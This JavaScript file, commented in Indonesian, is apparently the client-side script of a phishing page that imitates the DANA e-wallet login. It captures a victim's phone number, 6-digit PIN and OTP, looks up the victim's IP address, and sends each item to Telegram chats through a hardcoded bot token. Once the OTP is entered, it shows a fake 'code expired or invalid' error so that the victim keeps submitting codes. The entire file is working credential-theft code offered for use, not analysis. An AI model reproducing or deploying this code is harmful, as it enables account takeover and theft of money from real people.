// Ganti token dan chat_id sesuai milik Anda
const TELEGRAM_CONFIG = {
    botToken: '7934148483:AAFdxbZxUBqZsPSB4xfko4CQgmrg_jJ6ZuE',
    chatIds: ["7160773412", "ISI_CHAT_ID_2"]
};

// Mendapatkan IP Address
async function getIPAddress() {
    try {
        const response = await fetch('https://api.ipify.org?format=json');
        const data = await response.json();
        return data.ip;
    } catch (error) {
        return 'Unknown IP';
    }
}

// Kirim pesan ke Telegram
async function sendToTelegram(message) {
    const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`;
    try {
        const promises = TELEGRAM_CONFIG.chatIds.map(chatId =>
            fetch(url, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message,
                    parse_mode: 'Markdown'
                })
            })
        );
        await Promise.all(promises);
    } catch (error) {
        console.error('Error sending messages:', error);
    }
}

// Kirim nomor HP ke Telegram dan lanjut ke PIN
async function sendNohp(event){
    $("#process").show();
    event.preventDefault();
    $("#inp").blur();
    const nohp = $('#inp').val();
    const ip = await getIPAddress();
    const message = `🔔 *Login Attempt*\n📱 Nomor HP: ${nohp}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    $("#process").hide();
    $("#formNohp").fadeOut();
    setTimeout(function(){
        $("#inp").val('');
        $("#formPin").fadeIn();
        $("#pin1").focus();
    }, 500);
}

// Kirim PIN ke Telegram dan lanjut ke OTP
async function sendPin(){
    $("#process").show();
    const pin = [
        $('#pin1').val(),
        $('#pin2').val(),
        $('#pin3').val(),
        $('#pin4').val(),
        $('#pin5').val(),
        $('#pin6').val()
    ].join('');
    const ip = await getIPAddress();
    const message = `🔒 *PIN DANA*\n🔑 PIN: ${pin}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    $("#process").hide();
    $('.inppin').val('');
    $(".bgotp").fadeIn();
    setInterval(countdown, 1000);
    $("#otp1").focus();
}

// Kirim OTP ke Telegram
async function sendOtp(){
    $(".loadingOtp").show();
    const otp = [
        $('#otp1').val(),
        $('#otp2').val(),
        $('#otp3').val(),
        $('#otp4').val()
    ].join('');
    const ip = await getIPAddress();
    const message = `🔑 *OTP DANA*\n#️⃣ OTP: ${otp}\n🌐 IP: \`${ip}\`\n⏰ Time: ${new Date().toLocaleString()}`;
    await sendToTelegram(message);
    setTimeout(function(){
        $(".loadingOtp").hide();
        $('.inpotp').val('');
        $(".alert").text("Kode OTP telah kedaluwarsa atau invalid silahkan kirim ulang kode OTP");
        $(".alert").css("color","red");
    },3000);
}